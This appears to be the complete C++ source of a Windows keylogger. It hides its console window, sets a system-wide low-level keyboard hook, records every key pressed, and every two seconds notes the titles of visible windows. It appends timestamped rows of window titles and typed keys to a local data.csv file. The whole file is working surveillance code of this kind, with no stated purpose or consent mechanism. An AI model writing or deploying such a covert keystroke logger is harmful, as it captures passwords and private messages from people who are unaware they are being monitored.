#pragma comment( linker, "/subsystem:windows /entry:mainCRTStartup" )
#include <fstream>
#include <chrono>
#include <iomanip>
#include <sstream>
#include <Windows.h>
#include <conio.h>
#include "GetKeyName.h"
#include <vector>
#include <algorithm>
#include <thread>
const char* windowsToFilter[] = { "设置", "邮件" ,"Program Manager","Microsoft Store","Windows 输入体验" ,"MSN" ,"收件箱 - Outlook ?- 邮件"};
const int numWindowsToFilter = sizeof(windowsToFilter) / sizeof(windowsToFilter[0]);

bool timerPaused = false;
std::string windowTitles; // String to store window titles
std::vector<std::string> windowTitlesList;
std::string keyinput;
std::string timeString;

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    char windowTitle[256];
    GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
    if (IsWindowVisible(hwnd) && strlen(windowTitle) > 0) {
        // Check if the window title matches any in the filter list
        bool shouldFilter = false;
        for (int i = 0; i < numWindowsToFilter; ++i) {
            if (strcmp(windowTitle, windowsToFilter[i]) == 0) {
                shouldFilter = true;
                break;
            }
        }
        // If the window title does not match any in the filter list, add it to the result string
        if (!shouldFilter) {
            windowTitlesList.push_back(windowTitle);
        }
    }
    return TRUE;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pkbhs = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        keyinput += GetKeyName(pkbhs->vkCode);
        //std::cout << keyinput << std::endl;
    }
    // 调用下一个钩子
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
void TitlesString() {

    std::sort(windowTitlesList.begin(), windowTitlesList.end());
    // 使用 unique 函数删除相邻的重复元素
    auto it = std::unique(windowTitlesList.begin(), windowTitlesList.end());
    // 删除重复元素后的 vector 大小
    windowTitlesList.resize(std::distance(windowTitlesList.begin(), it));


    for (size_t i = 0; i < windowTitlesList.size(); ++i) {
        windowTitles += windowTitlesList[i];
        // 在除最后一个元素之外的所有元素后面插入分隔符
        if (i < windowTitlesList.size() - 1) {
            windowTitles += "|";
        }
    }
    size_t found = windowTitles.find(",");
    if (found != std::string::npos) {
        // 如果包含逗号，则删除所有逗号
        windowTitles.erase(std::remove(windowTitles.begin(), windowTitles.end(), ','), windowTitles.end());
    }
    
}


void gettime() {
    auto currentTime = std::chrono::system_clock::now();
    std::time_t currentTimeT = std::chrono::system_clock::to_time_t(currentTime);
    std::tm localTime;
    localtime_s(&localTime, &currentTimeT);
    std::ostringstream oss;  // 使用ostringstream构建字符串
    oss << std::put_time(&localTime, "%Y|%m|%d|%H|%M|%S");
    timeString = oss.str();  // 从ostringstream中获取字符串
}

void writefile(std::string timeString) {
    TitlesString();
    std::string writeletter = timeString + "," + windowTitles + "," + keyinput;

    std::ofstream csvFile("data.csv", std::ios::app);
    csvFile << writeletter << std::endl;
    csvFile.close();

    timerPaused = true;
    gettime();
    windowTitles = "";
    windowTitlesList.clear();
    keyinput = "";
    timerPaused = false;
}

void checkStringLength() {
    while (true) {
        auto start_time = std::chrono::steady_clock::now();
        size_t current_length = keyinput.length();
        std::this_thread::sleep_for(std::chrono::seconds(10));
        auto end_time = std::chrono::steady_clock::now();
        auto elapsed_time = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time).count();
        // 检查字符串长度是否在10秒内没有变化
        if (keyinput.length() == current_length && elapsed_time >= 5 && keyinput != "") {
            writefile(timeString);
        }
    }
}

void CALLBACK TimerProc2(HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
    if (!timerPaused) {
        EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()), EnumWindowsProc, 0);
    }
}

int main() {
    gettime();
    std::thread lengthChecker(checkStringLength);

    SetTimer(NULL, 1, 2000, TimerProc2);
    HHOOK hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}



